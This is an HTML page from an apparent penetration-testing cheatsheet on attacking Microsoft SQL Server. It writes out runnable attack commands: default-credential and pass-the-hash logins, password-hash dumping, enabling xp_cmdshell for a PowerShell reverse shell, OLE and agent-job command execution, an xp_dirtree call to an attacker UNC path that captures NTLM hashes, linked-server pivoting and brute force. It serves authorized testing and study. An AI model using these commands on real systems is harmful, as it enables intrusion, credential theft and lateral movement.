@@ -1,0 +1,496 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MSSQL · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Network › Service Footprinting</nav><h1>MSSQL</h1><p class="cx-lede">Microsoft SQL Server enumeration - instance discovery on UDP 1434, default sa credentials, schema browsing, xp_cmdshell-driven RCE, linked-server pivoting, and the impacket mssqlclient workflow.</p><div class="cx-tags"><span class="cx-tag">MITRE T1046, T1078, T1213, T1059.003</span><span class="cx-tag">D3FEND D3-NTA</span><span class="cx-tag">IMPACT RCE, DataExfil, CredentialTheft, Pivot</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Microsoft SQL Server listens on TCP 1433 by default. Two operator-relevant paths into a finding: weak/default credentials on the <code>sa</code> (system administrator) account, and the <code>xp_cmdshell</code> stored procedure that lets <code>sa</code>-level accounts run arbitrary OS commands. Linked-server configurations let you pivot from one MSSQL instance into others - sometimes with impersonation chains that escalate privileges along the way.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Service scan
+nmap -sV -sC -p1433 --script ms-sql-* &lt;target&gt;
+
+# 2. Try default sa creds
+impacket-mssqlclient sa:&#x27;&#x27;@&lt;target&gt;
+impacket-mssqlclient sa:&#x27;password&#x27;@&lt;target&gt;
+impacket-mssqlclient -windows-auth DOMAIN/user:pass@&lt;target&gt;
+
+# 3. Enumerate databases
+SQL&gt; select name from sys.databases;
+SQL&gt; use &lt;database&gt;;
+SQL&gt; select name from sys.tables;
+
+# 4. Enable and use xp_cmdshell
+SQL&gt; EXEC sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE;
+SQL&gt; EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1; RECONFIGURE;
+SQL&gt; EXEC xp_cmdshell &#x27;whoami&#x27;;
+
+# 5. List linked servers (pivot targets)
+SQL&gt; EXEC sp_linkedservers;</code></pre></figure>
+<p>Success indicator: successful <code>sa</code> login, command execution via <code>xp_cmdshell</code>, or <code>sp_linkedservers</code> revealing pivot paths to other database hosts.</p>
+<h2 id="protocol-overview">Protocol overview</h2>
+<p>MSSQL uses Microsoft's proprietary <strong>TDS (Tabular Data Stream)</strong> protocol over TCP 1433 by default. SQL Server can also be configured for:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>TCP 1433</strong></td>
+<td>Default instance</td>
+</tr>
+<tr>
+<td><strong>UDP 1434</strong></td>
+<td>SQL Browser service - answers "which port is instance X on?" queries</td>
+</tr>
+<tr>
+<td><strong>TCP dynamic</strong></td>
+<td>Named instances - port chosen at startup, registered with SQL Browser</td>
+</tr>
+<tr>
+<td><strong>TCP 4022</strong></td>
+<td>Service Broker (rare in practice)</td>
+</tr>
+<tr>
+<td><strong>TCP 5022</strong></td>
+<td>AlwaysOn availability group endpoints</td>
+</tr>
+</tbody>
+</table>
+<p>Most external-facing deployments use the default instance on 1433. Named instances on dynamic ports are common in internal AD environments - query the SQL Browser on UDP 1434 to discover them.</p>
+<h3 id="authentication-modes">Authentication modes</h3>
+<table>
+<thead>
+<tr>
+<th>Mode</th>
+<th>How it works</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>SQL Server authentication</strong></td>
+<td>Username + password, validated against MSSQL's own <code>sys.syslogins</code> table. Includes the built-in <code>sa</code> account.</td>
+</tr>
+<tr>
+<td><strong>Windows authentication</strong></td>
+<td>NTLM or Kerberos, validated against the local SAM or AD domain. SQL Server checks the Windows token against <code>sys.server_principals</code>.</td>
+</tr>
+<tr>
+<td><strong>Mixed mode</strong></td>
+<td>Both enabled. Default for most installs that need <code>sa</code> for application backends.</td>
+</tr>
+<tr>
+<td><strong>Windows-only mode</strong></td>
+<td>Only Windows auth allowed. <code>sa</code> exists but is disabled. The hardened option.</td>
+</tr>
+</tbody>
+</table>
+<p>When you see Mixed Mode plus an exposed 1433, the <code>sa</code> account is the first thing to test.</p>
+<h3 id="default-databases">Default databases</h3>
+<p>Every MSSQL instance has these system databases:</p>
+<table>
+<thead>
+<tr>
+<th>Database</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>master</code></td>
+<td>Server-level config - logins, server settings, linked servers</td>
+</tr>
+<tr>
+<td><code>model</code></td>
+<td>Template used when creating new databases</td>
+</tr>
+<tr>
+<td><code>msdb</code></td>
+<td>SQL Agent jobs, backup history</td>
+</tr>
+<tr>
+<td><code>tempdb</code></td>
+<td>Recreated at startup, used for temp tables and intermediate query results</td>
+</tr>
+<tr>
+<td><code>Resource</code></td>
+<td>Hidden - read-only definitions of all system objects</td>
+</tr>
+</tbody>
+</table>
+<p><code>master.sys.syslogins</code> and <code>master.sys.server_principals</code> are where login info lives.</p>
+<h2 id="default-configuration">Default configuration</h2>
+<p>Modern MSSQL installs (2017+) are reasonably secure by default:</p>
+<ul>
+<li><code>sa</code> login disabled in Windows-only auth mode</li>
+<li>Network protocols restricted to specific addresses</li>
+<li><code>xp_cmdshell</code> disabled</li>
+<li>TLS encryption for the wire protocol enabled</li>
+<li>Audit logging on for security-relevant events</li>
+</ul>
+<p>Legacy installs (2008, 2012, 2014) and admin-customized configs frequently deviate.</p>
+<h2 id="dangerous-settings">Dangerous settings</h2>
+<table>
+<thead>
+<tr>
+<th>Setting</th>
+<th>What it enables</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Mixed Mode + empty/weak <code>sa</code> password</td>
+<td>Direct RCE path once credentials are guessed</td>
+</tr>
+<tr>
+<td><code>xp_cmdshell</code> enabled (<code>sp_configure 'xp_cmdshell', 1</code>)</td>
+<td>Stored procedure that runs shell commands. Requires <code>sa</code> or <code>db_owner</code> of <code>master</code>.</td>
+</tr>
+<tr>
+<td><code>Ole Automation Procedures</code> enabled</td>
+<td><code>sp_OACreate</code> and friends - another RCE path</td>
+</tr>
+<tr>
+<td><code>Ad Hoc Distributed Queries</code> enabled</td>
+<td><code>OPENROWSET</code> against remote sources - exfil and SSRF-like primitives</td>
+</tr>
+<tr>
+<td><code>external scripts enabled</code></td>
+<td>Runs Python / R scripts. Each can be turned into RCE.</td>
+</tr>
+<tr>
+<td>TRUSTWORTHY databases</td>
+<td>Database can execute code with elevated server privileges</td>
+</tr>
+<tr>
+<td>Linked servers with cached credentials</td>
+<td>Allows pivoting to other DBs as the linked-login user</td>
+</tr>
+<tr>
+<td><code>Use Original Login on Linked Server</code> (<code>rpcout = true</code>)</td>
+<td>Linked-server queries impersonate the caller - chains of trust to abuse</td>
+</tr>
+<tr>
+<td><code>secure_file_priv</code> (no MSSQL equivalent - file ops via <code>xp_cmdshell</code> or <code>BULK INSERT</code>)</td>
+<td>Same effect via different mechanism</td>
+</tr>
+<tr>
+<td><code>CLR enabled</code></td>
+<td>.NET assemblies loaded into SQL Server - sandbox-escape paths exist</td>
+</tr>
+</tbody>
+</table>
+<p>The classic finding chain: Mixed Mode + weak <code>sa</code> + <code>xp_cmdshell</code> enabled (or enable-able by <code>sa</code>) = unauthenticated remote attacker gets command execution as the <code>MSSQLSERVER</code> service account, which on most installs is <code>NT Service\MSSQL$INSTANCENAME</code> - a built-in account with broad local access.</p>
+<h2 id="footprinting-commands">Footprinting commands</h2>
+<h3 id="service-scan">Service scan</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sudo nmap 10.0.14.128 -sV -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00
+| ms-sql-info:
+|   10.0.14.128:1433:
+|     Version:
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|     TCP port: 1433
+| ms-sql-ntlm-info:
+|   10.0.14.128:1433:
+|     Target_Name: DOMAIN
+|     NetBIOS_Domain_Name: DOMAIN
+|     NetBIOS_Computer_Name: SQL01
+|     DNS_Domain_Name: domain.local
+|     DNS_Computer_Name: SQL01.domain.local
+|     DNS_Tree_Name: domain.local
+|_    Product_Version: 10.0.17763
+| ms-sql-empty-password:
+|_  No login with empty password.</code></pre></figure>
+<p>Two valuable data points here even without successful login:</p>
+<ul>
+<li><strong><code>ms-sql-info</code></strong> - exact version (<code>2019 RTM</code>). Match to <a href="https://www.cvedetails.com/product/251/Microsoft-SQL-Server.html">CVE list for SQL Server</a>.</li>
+<li><strong><code>ms-sql-ntlm-info</code></strong> - leaks the AD domain (<code>DOMAIN</code>), full FQDN (<code>SQL01.domain.local</code>), and Windows version (<code>10.0.17763</code> = Server 2019). The SQL Server returned this from a pre-auth NTLM negotiation that you triggered without credentials. Gold for AD recon.</li>
+</ul>
+<p>Other useful NSE scripts:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>ms-sql-brute              # credential brute-force
+ms-sql-config             # configuration enumeration (needs creds)
+ms-sql-dac                # try the Dedicated Admin Connection
+ms-sql-dump-hashes        # password hash dump (needs creds)
+ms-sql-empty-password     # test empty password on default accounts
+ms-sql-hasdbaccess        # which databases the login can access (needs creds)
+ms-sql-info               # banner / version
+ms-sql-ntlm-info          # AD intel via NTLM challenge
+ms-sql-query              # run a query (needs creds)
+ms-sql-tables             # list tables (needs creds)
+ms-sql-xp-cmdshell        # test xp_cmdshell (needs sa)</code></pre></figure>
+<h3 id="metasploit-mssql_ping">Metasploit <code>mssql_ping</code></h3>
+<p>An alternative instance-discovery probe - it returns the server name, instance name, version, and whether named pipes / TCP are enabled:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">msf &gt; use auxiliary/scanner/mssql/mssql_ping
+msf &gt; set RHOSTS 10.0.14.128
+msf &gt; run</code></pre></figure>
+<p>Handy when the instance is on a non-default port - it queries the SQL Server Browser on UDP 1434 to enumerate instances - or when you just want the instance metadata without a full NSE scan.</p>
+<h3 id="connecting-with-impacket-mssqlclient">Connecting with impacket-mssqlclient</h3>
+<p><code>impacket-mssqlclient</code> is the operator-friendly client. It supports both SQL auth and Windows auth (NTLM relay, pass-the-hash, Kerberos):</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># SQL authentication
+impacket-mssqlclient sa:&#x27;P4ssw0rd!&#x27;@10.0.14.128
+
+# SQL auth, empty password
+impacket-mssqlclient sa:&#x27;&#x27;@10.0.14.128
+
+# Windows authentication
+impacket-mssqlclient -windows-auth DOMAIN/svc_sql:&#x27;Pass&#x27;@10.0.14.128
+
+# Pass-the-hash
+impacket-mssqlclient -windows-auth -hashes &lt;LM&gt;:&lt;NT&gt; DOMAIN/Administrator@10.0.14.128
+
+# Kerberos (with TGT in KRB5CCNAME)
+impacket-mssqlclient -windows-auth -k -no-pass DOMAIN/svc_sql@SQL01.domain.local</code></pre></figure>
+<p>Successful connection:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL01): Line 1: Changed database context to &#x27;master&#x27;.
+[*] INFO(SQL01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
+[!] Press help for extra shell commands
+SQL&gt;</code></pre></figure>
+<h3 id="database-enumeration">Database enumeration</h3>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SQL&gt; select name from sys.databases;
+name
+------------
+master
+tempdb
+model
+msdb
+ReportServer
+CRM_Production
+HRPortal
+finance_db
+
+SQL&gt; use CRM_Production;
+
+SQL&gt; select name from sys.tables;
+name
+-----------------
+Customers
+Orders
+LoginAttempts
+APITokens
+SystemUsers
+
+SQL&gt; select * from SystemUsers;
+SQL&gt; select column_name from information_schema.columns where table_name = &#x27;SystemUsers&#x27;;</code></pre></figure>
+<h3 id="user-and-role-enumeration">User and role enumeration</h3>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Current login and database user
+SQL&gt; select system_user, current_user;
+
+-- All logins on the server (login = server-level, user = database-level)
+SQL&gt; select name, type_desc, is_disabled from sys.server_principals
+     where type in (&#x27;S&#x27;,&#x27;U&#x27;,&#x27;G&#x27;) and name not like &#x27;##%&#x27;;
+
+-- Server-level role members
+SQL&gt; select sp.name as login, r.name as role
+     from sys.server_role_members rm
+     join sys.server_principals sp on rm.member_principal_id = sp.principal_id
+     join sys.server_principals r on rm.role_principal_id = r.principal_id;
+
+-- Check if current login is sysadmin
+SQL&gt; select is_srvrolemember(&#x27;sysadmin&#x27;);
+-- Returns 1 if yes</code></pre></figure>
+<h3 id="password-hash-extraction">Password hash extraction</h3>
+<p>Requires <code>sysadmin</code> (<code>sa</code>-equivalent):</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SQL&gt; select name, password_hash from sys.sql_logins;</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>name        password_hash
+sa          0x0200&lt;...&gt;     -- SHA-512 (since 2012), SHA-1 (older)
+svc_app     0x0200&lt;...&gt;
+report_ro   0x0200&lt;...&gt;</code></pre></figure>
+<p>Hashcat modes:</p>
+<ul>
+<li><strong><code>-m 1731</code></strong> - MSSQL 2012+ (SHA-512 based)</li>
+<li><strong><code>-m 132</code></strong> - MSSQL 2005 (SHA-1, no salt - easy)</li>
+<li><strong><code>-m 131</code></strong> - MSSQL 2000 (SHA-1, simpler - easier still)</li>
+</ul>
+<h3 id="xp_cmdshell-to-command-execution">xp_cmdshell to command execution</h3>
+<p><span class="cx-noise cx-noise-loud">Noise: loud</span></p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Check current state
+SQL&gt; EXEC sp_configure &#x27;xp_cmdshell&#x27;;
+-- column &quot;run_value&quot;: 0 means disabled, 1 means enabled
+
+-- Enable (requires sysadmin)
+SQL&gt; EXEC sp_configure &#x27;show advanced options&#x27;, 1;
+SQL&gt; RECONFIGURE;
+SQL&gt; EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;
+SQL&gt; RECONFIGURE;
+
+-- Run a command
+SQL&gt; EXEC xp_cmdshell &#x27;whoami&#x27;;
+output
+----------------------------
+nt service\mssql$sqlexpress
+
+SQL&gt; EXEC xp_cmdshell &#x27;powershell -e &lt;base64 cmd&gt;&#x27;;</code></pre></figure>
+<p>The output column streams stdout from the executed command. <code>impacket-mssqlclient</code> has a built-in shorthand for this:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>SQL&gt; enable_xp_cmdshell
+SQL&gt; xp_cmdshell whoami</code></pre></figure>
+<p>The shell runs as the SQL Server service account. By default that's <code>NT Service\MSSQL$&lt;INSTANCE&gt;</code> - a low-privilege built-in account on hardened installs, but on many production deployments it's a domain user with <code>db_owner</code> or <code>local administrator</code> permissions for the SQL host.</p>
+<h3 id="alternative-rce-paths-when-xp_cmdshell-is-locked-down">Alternative RCE paths (when xp_cmdshell is locked down)</h3>
+<p>If <code>xp_cmdshell</code> is disabled and you don't have rights to re-enable it:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Ole Automation
+SQL&gt; EXEC sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE;
+SQL&gt; EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1; RECONFIGURE;
+SQL&gt; DECLARE @cmd INT;
+     EXEC sp_OACreate &#x27;WScript.Shell&#x27;, @cmd OUTPUT;
+     EXEC sp_OAMethod @cmd, &#x27;Run&#x27;, NULL, &#x27;cmd.exe /c whoami &gt; C:\temp\out.txt&#x27;;
+
+-- CLR assembly (the &quot;robust&quot; path - survives many SQL hardening configurations)
+-- Requires writing a custom .NET assembly, signing, importing via CREATE ASSEMBLY,
+-- then CREATE PROCEDURE pointing at it. See PowerUpSQL for automation.
+
+-- agent_jobs (when SQL Agent service is running)
+SQL&gt; EXEC msdb.dbo.sp_add_job @job_name = &#x27;pwn&#x27;;
+SQL&gt; EXEC msdb.dbo.sp_add_jobstep @job_name = &#x27;pwn&#x27;, @step_name = &#x27;pwn1&#x27;,
+                                  @subsystem = &#x27;CmdExec&#x27;,
+                                  @command = &#x27;cmd.exe /c whoami &gt; C:\temp\out.txt&#x27;;
+SQL&gt; EXEC msdb.dbo.sp_add_jobserver @job_name = &#x27;pwn&#x27;;
+SQL&gt; EXEC msdb.dbo.sp_start_job &#x27;pwn&#x27;;</code></pre></figure>
+<p>Each of these has different prerequisites and detection footprint. <code>xp_cmdshell</code> is the loudest but simplest; CLR is the stealthiest but most setup.</p>
+<h3 id="linked-servers">Linked servers</h3>
+<p>Linked servers are MSSQL's mechanism for federating queries across instances. When configured with cached credentials, they're a pivot path:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SQL&gt; EXEC sp_linkedservers;
+SRV_NAME   SRV_PRODUCT   PROVIDER_NAME    DATA_SOURCE
+SQL01      SQL Server    SQLNCLI          SQL01           -- this server
+SQL02      SQL Server    SQLNCLI          SQL02           -- linked
+DC01-DATA  SQL Server    SQLNCLI          DC01-DATA.dom   -- another link</code></pre></figure>
+<p>Run a query on a linked server:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SQL&gt; SELECT * FROM OPENQUERY([SQL02], &#x27;SELECT system_user&#x27;);</code></pre></figure>
+<p>Whose credentials are used depends on the link config - <code>SELF</code>/<code>Current login</code> uses your token, <code>Specified</code> uses cached static creds. For chains:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- If SQL02 has a link back to SQL03, you can chain:
+SQL&gt; SELECT * FROM OPENQUERY([SQL02], &#x27;SELECT * FROM OPENQUERY([SQL03], &#x27;&#x27;SELECT system_user&#x27;&#x27;)&#x27;);</code></pre></figure>
+<p><code>xp_cmdshell</code> over linked servers - requires the linked login to have <code>sa</code> on the remote - completes the chain to RCE on the linked host:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SQL&gt; EXECUTE (&#x27;EXEC xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&#x27;) AT [SQL02];</code></pre></figure>
+<p><code>PowerUpSQL</code> automates link discovery and abuse - it walks the entire link graph and tells you which paths reach <code>sa</code> privilege.</p>
+<h3 id="ntlm-theft-via-xp_dirtree-xp_fileexist">NTLM theft via xp_dirtree / xp_fileexist</h3>
+<p><span class="cx-noise cx-noise-moderate">Noise: moderate</span></p>
+<p>A trick for unauthenticated NTLM hash capture from MSSQL service account when you have query access:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SQL&gt; EXEC master..xp_dirtree &#x27;\\&lt;attacker-ip&gt;\share&#x27;, 1, 1;</code></pre></figure>
+<p><code>xp_dirtree</code> makes the SQL Server connect to the attacker-controlled UNC path with the service account's credentials. Catch the NTLM authentication with <code>responder</code> or <code>inveigh</code> on your attack box:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sudo responder -I tun0</code></pre></figure>
+<p>The captured NTLMv2 hash goes into <code>hashcat -m 5600</code> for offline cracking, or <code>ntlmrelayx.py</code> for live relay against another service in scope.</p>
+<h3 id="brute-force">Brute-force</h3>
+<p><span class="cx-noise cx-noise-loud">Noise: loud</span></p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">hydra -L users.txt -P passwords.txt mssql://10.0.14.128
+crackmapexec mssql 10.0.14.128 -u sa -p passwords.txt</code></pre></figure>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># NSE script (default port, no creds needed)
+sudo nmap -p1433 --script ms-sql-brute --script-args \
+  userdb=users.txt,passdb=passwords.txt 10.0.14.128</code></pre></figure>
+<h2 id="common-chained-workflows">Common chained workflows</h2>
+<p><strong><code>sa</code> weak creds → <code>xp_cmdshell</code> → service account shell:</strong>
+1. <code>impacket-mssqlclient sa:Pass@target</code>
+2. Enable <code>xp_cmdshell</code> and <code>show advanced options</code>
+3. <code>xp_cmdshell 'powershell -e &lt;b64&gt;'</code> for a reverse shell to your handler
+4. From the SQL service account, run local-priv-esc tools</p>
+<p><strong>Limited login → linked-server chain → sa elsewhere:</strong>
+1. Login with non-sysadmin account
+2. <code>sp_linkedservers</code> reveals links to other instances
+3. <code>OPENQUERY</code> chain hits a link where you have <code>sa</code> due to misconfig
+4. RCE on that other instance, repeat</p>
+<p><strong>NTLM theft → relay → AD compromise:</strong>
+1. Any account that can <code>xp_dirtree</code>
+2. <code>responder</code> catches NTLMv2 from MSSQL service account
+3. If service account is over-privileged in AD, relay it to LDAP for ACL abuse</p>
+<p><strong>SQL injection on web app → MSSQL backend → server compromise:</strong>
+1. SQLi in a web app (see <a href="../../../web/sqli/index.html">SQL Injection</a>)
+2. Identify MSSQL backend via syntax errors or fingerprinting
+3. Stack SQL injection to enable <code>xp_cmdshell</code>
+4. Get RCE on the DB host without ever having creds</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Service scan</td>
+<td><code>nmap -sV --script ms-sql-* -p1433 &lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>AD intel via NTLM</td>
+<td><code>nmap --script ms-sql-ntlm-info -p1433 &lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>Connect (SQL auth)</td>
+<td><code>impacket-mssqlclient sa:Pass@&lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>Connect (Windows auth)</td>
+<td><code>impacket-mssqlclient -windows-auth DOMAIN/user:pass@&lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>Pass-the-hash</td>
+<td><code>impacket-mssqlclient -windows-auth -hashes :&lt;NT&gt; DOMAIN/user@&lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>List databases</td>
+<td><code>SELECT name FROM sys.databases;</code></td>
+</tr>
+<tr>
+<td>List tables</td>
+<td><code>SELECT name FROM sys.tables;</code></td>
+</tr>
+<tr>
+<td>Current user</td>
+<td><code>SELECT system_user, current_user;</code></td>
+</tr>
+<tr>
+<td>Am I sysadmin?</td>
+<td><code>SELECT is_srvrolemember('sysadmin');</code></td>
+</tr>
+<tr>
+<td>Dump login hashes</td>
+<td><code>SELECT name, password_hash FROM sys.sql_logins;</code></td>
+</tr>
+<tr>
+<td>Enable xp_cmdshell</td>
+<td><code>EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;</code></td>
+</tr>
+<tr>
+<td>Run command</td>
+<td><code>EXEC xp_cmdshell 'whoami';</code></td>
+</tr>
+<tr>
+<td>List linked servers</td>
+<td><code>EXEC sp_linkedservers;</code></td>
+</tr>
+<tr>
+<td>Query linked server</td>
+<td><code>SELECT * FROM OPENQUERY([SQL02], 'SELECT system_user');</code></td>
+</tr>
+<tr>
+<td>NTLM capture</td>
+<td><code>EXEC master..xp_dirtree '\\\\&lt;attacker-ip&gt;\\share', 1, 1;</code></td>
+</tr>
+<tr>
+<td>Brute force</td>
+<td><code>hydra -L users -P pass mssql://&lt;target&gt;</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="next-move">Next move</h2>
+<ul>
+<li><strong>Got <code>sa</code> or admin via brute / SQLi / default creds</strong> → enable xp_cmdshell and pop a shell (<code>reconfigure; exec sp_configure 'xp_cmdshell',1; reconfigure; exec xp_cmdshell 'whoami'</code>)</li>
+<li><strong>xp_cmdshell disabled and reconfigure blocked</strong> → try <a href="#alternative-rce-paths-when-xp_cmdshell-is-locked-down">alternative RCE paths</a> (CLR assembly, OLE Automation, agent jobs)</li>
+<li><strong><code>xp_cmdshell whoami</code> returns service account</strong> → confirm <code>SeImpersonate</code> is held, then chain into <a href="../../../windows/privesc/seimpersonate/index.html">SeImpersonate → SYSTEM via potato</a> (this is the canonical MSSQL → SYSTEM path)</li>
+<li><strong>NTLM theft worked (<code>xp_dirtree</code> callback hit Responder)</strong> → captured hash is the SQL service account; crack offline (hashcat mode 5600) or relay to other hosts with <a href="../smb/index.html">ntlmrelayx</a></li>
+<li><strong>Linked servers visible</strong> → <code>EXEC ('command') AT [LINKED_SERVER]</code> - chain through to internal databases not directly reachable from your network position</li>
+<li><strong>Got non-admin credentials</strong> → enumerate role memberships (<code>SELECT IS_SRVROLEMEMBER('sysadmin')</code>); check for <code>IMPERSONATE</code> permission on higher-privileged logins (escalation primitive without needing sa)</li>
+<li><strong>Read access to interesting databases</strong> → dump credentials tables, app secrets, integration tokens; try harvested credentials against <a href="../smb/index.html">SMB</a> and other services on the same network</li>
+<li><strong>Nothing works with current creds</strong> → password-spray, check public sources for default install creds, or pivot to <a href="../index.html">other services on the host</a> - SMB and WinRM may have weaker auth</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../mysql/index.html">Previous: MySQL</a><a class="cx-next" href="../oracle-tns/index.html">Next: Oracle TNS</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
